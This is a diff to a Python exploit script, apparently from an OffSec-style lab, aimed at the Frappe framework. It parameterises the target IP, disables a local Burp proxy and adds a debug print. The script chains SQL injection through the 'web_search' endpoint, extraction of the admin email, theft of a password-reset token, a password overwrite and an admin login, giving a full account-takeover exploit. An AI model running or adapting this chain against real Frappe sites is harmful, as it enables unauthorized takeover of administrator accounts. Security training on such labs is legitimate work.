@@ -6,7 +6,7 @@ import json
 requests.packages.urllib3.disable_warnings()
 
 def send_sql_comamnd(ip, command):
-	target = f"http://192.168.247.123:8000"
+	target = f"http://{ip}:8000"
 	data = {
 		"cmd": "frappe.utils.global_search.web_search",
 		"text": "offsec",
@@ -38,13 +38,13 @@ def get_admin_user_email(ip):
 	return admin_email
 
 def send_reset_password(ip, admin_email):
-	target = f"http://192.168.247.123:8000"
+	target = f"http://{ip}:8000"
 	data = {
 		"cmd": "frappe.core.doctype.user.user.reset_password",
 		"user": admin_email
 	}
 	r = requests.post(target, data=data)
-
+	print(r.text)
 	if "Password reset instructions" not in r.text:
 		print("Password reset unsuccessful")
 		exit(0)
@@ -65,20 +65,22 @@ def get_password_reset_token(ip, admin_email):
 def reset_password(ip, admin_email, token, new_password):
 	s = requests.Session()
 
-	proxies = {
-		'http': 'http://127.0.0.1:8080',
-		'https': 'http://127.0.0.1:8080'
-	}
-	s.proxies.update(proxies)
+	# proxies = {
+	# 	'http': 'http://127.0.0.1:8080',
+	# 	'https': 'http://127.0.0.1:8080'
+	# }
+	# s.proxies.update(proxies)
 
-	target = f"http://192.168.247.123:8000"
+	target = f"http://{ip}:8000"
 	data = {
 		"key": token,
 		"old_password": "",
 		"new_password": new_password,
 		"cmd": "frappe.core.doctype.user.user.update_password"
 	}
+
 	r = s.post(target,data=data)
+
 	if "/desk" in r.text:
 		print("Password reset successful!")
 		print(f"New password: {new_password}")
@@ -90,7 +92,7 @@ def reset_password(ip, admin_email, token, new_password):
 def login(ip, admin_email, password):
 	s = requests.Session() # Send request with session to keep persistent session variable
 
-	target = f"http://192.168.247.123:8000"
+	target = f"http://{ip}:8000"
 	data = {
 		"cmd": "login",
 		"usr": admin_email,
@@ -103,11 +105,11 @@ def login(ip, admin_email, password):
 	}
 	s.headers.update(headers)
 
-	proxies = {
-		'http': 'http://127.0.0.1:8080',
-		'https': 'http://127.0.0.1:8080'
-	}
-	s.proxies.update(proxies)
+	# proxies = {
+	# 	'http': 'http://127.0.0.1:8080',
+	# 	'https': 'http://127.0.0.1:8080'
+	# }
+	# s.proxies.update(proxies)
 
 	r = s.post(target, data=data)
 
